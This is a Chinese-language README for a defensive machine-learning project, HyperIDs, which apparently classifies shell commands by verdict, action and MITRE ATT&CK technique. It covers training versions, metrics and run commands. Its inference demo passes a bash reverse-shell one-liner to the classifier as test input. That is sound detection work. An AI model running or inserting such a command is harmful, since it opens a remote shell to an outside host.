# model/ —— 训练与推理

## 命名约定

- **项目/模型名：HyperIDs**。
- **GLiClass**：第三方多标签分类框架（库），不是本项目模型名。
- **编码器/骨干**：`prajjwal1/bert-small`（当前最终版）；历史版本用过
  `google/electra-small-discriminator`、`jhu-clsp/ettin-encoder-32m`（gliclass-edge 的骨干）。

## 目录结构

```text
model/
  train.py            # 当前最终训练入口（v2：bert-small + 31 标签）
  eval.py             # 当前最终评估（verdict_acc + action micro-F1）
  predict.py          # 当前本地推理（verdict + action + 派生 MITRE）
  experiments/        # 历史训练实验（保留以展示演化过程）
    v1_electra_199.py        # v1: electra-small，199 标签
    v2_gliclass_edge_199.py  # v2: gliclass-edge-v3.0(Ettin-32m)，199 标签
    v3_bert_132.py           # v3: bert-small，132 标签（technique 折叠）
    eval_199_132.py / infer_199.py / tune_thresholds.py / prepare_data_199.py / prune_vocab_edge.py
  checkpoints/        # 训练中的中间 checkpoint
  checkpoints_gpu/    # 下载到本地的最终 checkpoint（含 ONNX）
```

## 训练演化过程

| 版本 | 基座/骨干 | 标签 | 结果 |
|---|---|---|---|
| v1 | electra-small（13.75M） | 199（risk+intent+tactic+technique） | overall 0.6575，technique 0.486 |
| v2 | gliclass-edge-v3.0 / Ettin-32m（32.7M） | 199 | overall 0.7836，technique 0.751 |
| v3 | bert-small（29.8M） | 132（technique 子技术折叠） | overall 0.7911，technique 0.790 |
| **v4（最终）** | **bert-small（29.8M）** | **31（verdict 3 + action 28）** | **verdict_acc 0.917，action F1 0.909，INT8 96MB 无损** |

> 演化主线：199 个难学的 MITRE 标签 → 去噪/折叠 → 31 个「verdict + 客观动作」，
> MITRE tactic/technique 改为 `schema.derive_attck()` 规则推导。

## 运行

```bash
# 训练（L4）
python -m model.train --epochs 4 --batch_size 32 --lr 5e-5 --save_name final_model_v2

# 评估
python -m model.eval --model_dir model/checkpoints_gpu/final_model_v2 --split test

# 推理 demo
python -m model.predict "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
```
